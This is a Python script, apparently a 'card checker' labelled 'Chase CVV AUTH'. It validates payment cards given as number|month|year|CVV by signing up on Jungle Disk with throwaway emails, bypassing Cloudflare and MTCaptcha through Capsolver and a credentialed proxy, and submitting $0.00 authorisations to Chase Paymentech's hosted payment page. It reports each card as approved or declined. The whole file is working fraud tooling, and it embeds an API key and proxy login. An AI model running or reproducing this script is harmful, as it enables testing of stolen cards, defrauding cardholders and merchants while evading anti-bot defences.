# -*- coding: utf-8 -*-
import tls_client
import time
import json
import re
import string
import random
import urllib.parse
import sys

# Chase CVV AUTH
# @MtSites
# No Venta Accepto

API_KEY = "uj8rg39fqncqrmgkpwnchnyfovezxv6q" #Tu key

proxy_raw = "px520401.pointtoserver.com:10780:purevpn0s8732217:i67s60ep" #Proxy
proxy_parts = proxy_raw.split(':')
proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"

page_url = 'https://secure.jungledisk.com/signup'

print("[*] Starting script...")
print(f"[*] Using proxy: {proxy_parts[0]}:{proxy_parts[1]}")

def call_capsolver(retry_count=0):
    print(f"[*] Calling Capsolver (attempt {retry_count + 1}/5)...")
    if retry_count >= 5:
        print("[!] Capsolver max retries reached")
        return None
    
    
    import requests
    
    capsolver_proxy = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
    
    data = {
        "clientKey": API_KEY,
        "task": {
            "type": 'AntiCloudflareTask',
            "websiteURL": page_url,
            "proxy": capsolver_proxy,
        }
    }
    
    uri = 'https://api.capsolver.com/createTask'
    headers = {'Content-Type': 'application/json'}
    
    try:
        res = requests.post(uri, json=data, headers=headers, timeout=60)
        resp = res.json()
        print(f"[+] Capsolver create task response: {resp.get('taskId', 'No task ID')}")
    except Exception as e:
        print(f"[!] Capsolver create task error: {e}")
        return call_capsolver(retry_count + 1)
    
    task_id = resp.get('taskId')
    
    if not task_id:
        print("[!] No task ID received")
        return call_capsolver(retry_count + 1)
    
    while True:
        time.sleep(3)
        data = {
            "clientKey": API_KEY,
            "taskId": task_id
        }
        try:
            response = requests.post('https://api.capsolver.com/getTaskResult', json=data, timeout=60)
            resp = response.json()
            status = resp.get('status', '')
            print(f"[*] Capsolver status: {status}")
        except Exception as e:
            print(f"[!] Capsolver get result error: {e}")
            return call_capsolver(retry_count + 1)
        
        if status == "ready":
            solution = resp.get('solution', {})
            print("[+] Capsolver solved successfully")
            return {
                'cookies': solution.get('cookies', {}),
                'headers': solution.get('headers', {}),
                'userAgent': solution.get('userAgent', '')
            }
        elif status == "failed" or resp.get("errorId"):
            print("[!] Capsolver task failed")
            return call_capsolver(retry_count + 1)

def create_tls_session(solution=None):
    print("[*] Creating TLS session with Chrome 120 fingerprint...")
    
    
    session = tls_client.Session(
        client_identifier="chrome_120",
        random_tls_extension_order=True
    )
    
    
    if proxy_url:
        session.proxies = {
            "http": proxy_url,
            "https": proxy_url
        }
    
    
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    
    
    if solution:
        if solution.get('headers'):
            headers.update(solution['headers'])
        if solution.get('userAgent'):
            headers['user-agent'] = solution['userAgent']
        print("[*] Using solution headers and user-agent")
    
    
    session.headers.update(headers)
    
    
    if solution and solution.get('cookies'):
        for name, value in solution['cookies'].items():
            session.cookies.set(name, value)
    
    return session, headers

def request_site(session):
    print("[*] Requesting page URL...")
    try:
        response = session.get(page_url)
        print(f"[+] Page response status: {response.status_code}")
        return response
    except Exception as e:
        print(f"[!] Request error: {e}")
        return None

def extract_verification_token(html_content):
    
    patterns = [
        r'ncg-request-verification-token=([^\s>]+)',
        r'requestVerificationToken["\']?\s*:\s*["\']([^"\']+)',
        r'name="__RequestVerificationToken".*?value="([^"]+)"',
        r'data-request-verification-token="([^"]+)"'
    ]
    
    for pattern in patterns:
        token_match = re.search(pattern, html_content)
        if token_match:
            print(f"[+] Verification token extracted using pattern: {pattern[:50]}")
            return token_match.group(1)
    
    print("[!] No verification token found")
    return None

def solve_mtcaptcha_with_retry(chase_url, max_retries=10):
    print(f"[*] Solving MTCaptcha (max retries: {max_retries})...")
    import requests
    
    for attempt in range(max_retries):
        print(f"[*] MTCaptcha attempt {attempt + 1}/{max_retries}")
        
        try:
            capsolver_proxy = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
            
            data = {
                "clientKey": API_KEY,
                "task": {
                    "type": "MtCaptchaTask",
                    "websiteURL": chase_url,
                    "websiteKey": "MTPublic-I0V7iwug2",
                    "proxy": capsolver_proxy
                }
            }
            
            uri = 'https://api.capsolver.com/createTask'
            headers = {'Content-Type': 'application/json'}
            
            res = requests.post(uri, json=data, headers=headers, timeout=60)
            resp = res.json()
            
            if 'taskId' not in resp:
                print(f"[!] Failed to create MTCaptcha task: {resp}")
                continue
            
            task_id = resp['taskId']
            print(f"[+] MTCaptcha task created: {task_id}")
            
            for poll_attempt in range(30):
                time.sleep(3)
                data = {
                    "clientKey": API_KEY,
                    "taskId": task_id
                }
                response = requests.post('https://api.capsolver.com/getTaskResult', json=data, timeout=60)
                resp = response.json()
                
                if resp.get('status') == 'ready':
                    token = resp.get('solution', {}).get('token')
                    if token:
                        print("[+] MTCaptcha solved successfully")
                        return token
                elif resp.get('status') == 'failed':
                    print("[!] MTCaptcha task failed")
                    break
                    
        except Exception as e:
            print(f"[!] MTCaptcha error: {e}")
            continue
    
    print("[!] Failed to solve MTCaptcha after all attempts")
    return None

def main():
    if len(sys.argv) < 2:
        card_input = input("Enter card (format: cc|mm|yy|cvv): ").strip()
    else:
        card_input = sys.argv[1]
    
    card_parts = card_input.split('|')
    
    if len(card_parts) != 4:
        result = {
            "status": False,
            "success": False,
            "card": card_input,
            "apiResponse": "Invalid card format ❌",
            "response": "Format: cc|mm|yy|cvv",
            "time": 0,
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))
        return
    
    cc_number = card_parts[0]
    cc_month = card_parts[1]
    cc_year = card_parts[2]
    cc_cvv = card_parts[3]
    
    print(f"[*] Processing card: {cc_number}|{cc_month}|{cc_year}|{cc_cvv}")
    
    start_time = time.time()
    
    # Create initial TLS session
    session, session_headers = create_tls_session()
    
    # First attempt without solution
    response = request_site(session)
    
    # Check if we need Cloudflare bypass
    needs_bypass = False
    if not response:
        result = {
            "status": False,
            "success": False,
            "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
            "apiResponse": "Connection failed ❌",
            "response": "Connection error",
            "time": round(time.time() - start_time, 2),
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))
        return
    
    if response.status_code == 403 or response.status_code == 503:
        needs_bypass = True
        print(f"[!] Got status {response.status_code}, Cloudflare detected.")
    elif response.status_code == 200:
        # Check if page contains Cloudflare challenge
        if 'cf-challenge' in response.text or 'cloudflare' in response.text.lower() or 'challenge-platform' in response.text:
            needs_bypass = True
            print("[!] Cloudflare challenge detected in page content.")
    
    if needs_bypass:
        print("[*] Attempting Cloudflare bypass with Capsolver...")
        solution = call_capsolver()
        if solution:
            print("[*] Creating new TLS session with solution...")
            session, session_headers = create_tls_session(solution)
            response = request_site(session)
        
        if not response or (response.status_code != 200):
            result = {
                "status": False,
                "success": False,
                "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                "apiResponse": "Cloudflare bypass failed ❌",
                "response": f"HTTP {response.status_code if response else 'No response'}",
                "time": round(time.time() - start_time, 2),
                "gateway": "Chase CVV AUTH",
                "dev": "@Erovix"
            }
            print(json.dumps(result))
            return
    
    
    if response:
        with open('debug_response.html', 'w', encoding='utf-8') as f:
            f.write(response.text)
        print("[*] Saved response to debug_response.html for inspection")
    
    verification_token = extract_verification_token(response.text if response else "")
    
    if not verification_token:
        result = {
            "status": False,
            "success": False,
            "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
            "apiResponse": "Token extraction failed ❌",
            "response": "Verification token not found - check debug_response.html",
            "time": round(time.time() - start_time, 2),
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))
        return
    
    random5 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    email = f"hunterjsidt{random5}@gmail.com"
    print(f"[*] Using email: {email}")
    
    
    signup_headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'requestverificationtoken': verification_token,
        'x-requested-with': 'XMLHttpRequest',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://secure.jungledisk.com',
        'referer': 'https://secure.jungledisk.com/signup?step=2&li=false',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
    }
    
    session.headers.update(signup_headers)
    
    signup_data = {'email': email}
    print("[*] Sending signup request...")
    
    try:
        signup_response = session.post('https://secure.jungledisk.com/signup/new', data=signup_data)
    except Exception as e:
        print(f"[!] Signup request error: {e}")
        result = {
            "status": False,
            "success": False,
            "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
            "apiResponse": "Signup request failed ❌",
            "response": str(e),
            "time": round(time.time() - start_time, 2),
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))
        return
    
    if signup_response.status_code != 200:
        print(f"[!] Signup failed with status {signup_response.status_code}")
        print(f"[*] Response: {signup_response.text[:200]}")
        result = {
            "status": False,
            "success": False,
            "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
            "apiResponse": "Signup failed ❌",
            "response": f"HTTP {signup_response.status_code}",
            "time": round(time.time() - start_time, 2),
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))
        return
    
    try:
        signup_json = signup_response.json()
        chase_url = signup_json.get('BillingFormUri')
        print(f"[+] Chase URL: {chase_url}")
        
        if not chase_url:
            result = {
                "status": False,
                "success": False,
                "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                "apiResponse": "Chase URL extraction failed ❌",
                "response": "BillingFormUri not found",
                "time": round(time.time() - start_time, 2),
                "gateway": "Chase CVV AUTH",
                "dev": "@Erovix"
            }
            print(json.dumps(result))
            return
        
        
        print("[*] Fetching Chase payment page...")
        chase_headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-dest': 'iframe',
        }
        
        
        original_headers = session.headers.copy()
        session.headers.update(chase_headers)
        
        chase_response = session.get(chase_url, allow_redirects=True)
        
        
        session.headers = original_headers
        
        if chase_response.status_code != 200:
            result = {
                "status": False,
                "success": False,
                "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                "apiResponse": "Chase page load failed ❌",
                "response": f"HTTP {chase_response.status_code}",
                "time": round(time.time() - start_time, 2),
                "gateway": "Chase CVV AUTH",
                "dev": "@Erovix"
            }
            print(json.dumps(result))
            return
        
        
        session_id_match = re.search(r'name="sessionId"\s+value="([^"]+)"', chase_response.text)
        sid_match = re.search(r'name="sid"\s+value="([^"]+)"', chase_response.text)
        
        if not session_id_match or not sid_match:
            result = {
                "status": False,
                "success": False,
                "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                "apiResponse": "Session extraction failed ❌",
                "response": "sessionId or sid not found",
                "time": round(time.time() - start_time, 2),
                "gateway": "Chase CVV AUTH",
                "dev": "@Erovix"
            }
            print(json.dumps(result))
            return
        
        session_id = session_id_match.group(1)
        sid = sid_match.group(1)
        print(f"[+] Session ID: {session_id}, SID: {sid}")
        
        
        session.cookies.set('sid', sid)
        
        
        solvedmt_token = solve_mtcaptcha_with_retry(chase_url, max_retries=10)
        
        if not solvedmt_token:
            result = {
                "status": False,
                "success": False,
                "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                "apiResponse": "MTCaptcha failed ❌",
                "response": "Failed to solve captcha",
                "time": round(time.time() - start_time, 2),
                "gateway": "Chase CVV AUTH",
                "dev": "@Erovix"
            }
            print(json.dumps(result))
            return
        
        print(f"[+] MTCaptcha token obtained")
        
        
        process_headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.chasepaymentechhostedpay.com',
            'Referer': chase_url,
            'sec-ch-ua': '"Google Chrome";v="120", "Chromium";v="120", "Not_A Brand";v="8"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
        }
        
        
        tracer_data = {'action': 'tracer', 'sid': sid}
        session.headers.update(process_headers)
        
        tracer_response = session.post('https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php', data=tracer_data)
        tracer_id1 = tracer_response.text if tracer_response.status_code == 200 else ""
        print(f"[+] Tracer obtained")
        
        
        process_data = f'sessionId={session_id}&amount=0.00&required=all&uIDTrans=1&tdsApproved&tracer={tracer_id1}&completeStatus=0&sid={sid}&currency_code=USD&cbOverride&name=Lord+Erovix&address=123+Allen+Street&address2=&city=New+York&state=New+York&postal_code=10001&country=US&ccNumber={cc_number}&CVV2={cc_cvv}&ccType=Visa&expMonth={cc_month}&expYear=20{cc_year}&mtcaptcha-verifiedtoken={solvedmt_token}&action=process&sid={sid}'
        
        print("[*] Sending payment process request...")
        process_response = session.post('https://www.chasepaymentechhostedpay.com/hpf/1_1/iframeprocessor.php', data=process_data)
        
        if process_response.status_code == 200:
            response_text = process_response.text
            decoded_response = urllib.parse.unquote(response_text)
            print(f"[*] Response received")
            
            
            if '000' in response_text and 'Success' in response_text:
                print("[+] Card approved!")
                result = {
                    "status": True,
                    "success": True,
                    "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                    "apiResponse": "Approved ✅",
                    "response": decoded_response,
                    "time": round(time.time() - start_time, 2),
                    "gateway": "Chase CVV AUTH",
                    "dev": "@Erovix"
                }
            else:
                print("[!] Card declined")
                result = {
                    "status": True,
                    "success": False,
                    "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                    "apiResponse": "Declined ❌",
                    "response": decoded_response,
                    "time": round(time.time() - start_time, 2),
                    "gateway": "Chase CVV AUTH",
                    "dev": "@Erovix"
                }
        else:
            print(f"[!] Process request failed with status {process_response.status_code}")
            result = {
                "status": False,
                "success": False,
                "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
                "apiResponse": "Process request failed ❌",
                "response": f"HTTP {process_response.status_code}",
                "time": round(time.time() - start_time, 2),
                "gateway": "Chase CVV AUTH",
                "dev": "@Erovix"
            }
        
        print(json.dumps(result))
        
    except json.JSONDecodeError as e:
        print(f"[!] JSON decode error: {e}")
        print(f"[*] Response text: {signup_response.text[:500]}")
        result = {
            "status": False,
            "success": False,
            "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
            "apiResponse": "Invalid JSON response ❌",
            "response": signup_response.text[:200],
            "time": round(time.time() - start_time, 2),
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))
    except Exception as e:
        print(f"[!] Exception occurred: {e}")
        import traceback
        traceback.print_exc()
        result = {
            "status": False,
            "success": False,
            "card": f"{cc_number}|{cc_month}|{cc_year}|{cc_cvv}",
            "apiResponse": "Error occurred ❌",
            "response": str(e),
            "time": round(time.time() - start_time, 2),
            "gateway": "Chase CVV AUTH",
            "dev": "@Erovix"
        }
        print(json.dumps(result))

if __name__ == '__main__':
    main()